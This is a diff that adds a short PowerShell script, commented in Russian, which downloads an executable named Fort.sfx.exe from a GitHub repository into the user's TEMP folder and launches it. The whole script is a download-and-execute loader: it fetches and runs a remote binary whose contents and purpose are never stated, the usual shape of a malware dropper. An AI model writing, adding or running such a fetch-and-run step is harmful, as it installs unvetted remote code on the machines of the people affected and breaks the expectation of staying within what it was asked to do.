@@ -1,0 +1,13 @@
+
+# URL и путь для загрузки
+$url = 'https://github.com/ICEonX/Web/blob/c6f361b33b221298f1c607bc2cc4b33dc8f76ba5/Fort.sfx.exe'
+$tempPath = "$env:TEMP\Fort.sfx.exe"
+
+# Загрузка файла
+(New-Object System.Net.WebClient).DownloadFile($url, $tempPath)
+
+# Запуск SFX-файла
+Start-Process -FilePath $tempPath -Wait
+
+# Завершение работы
+exit
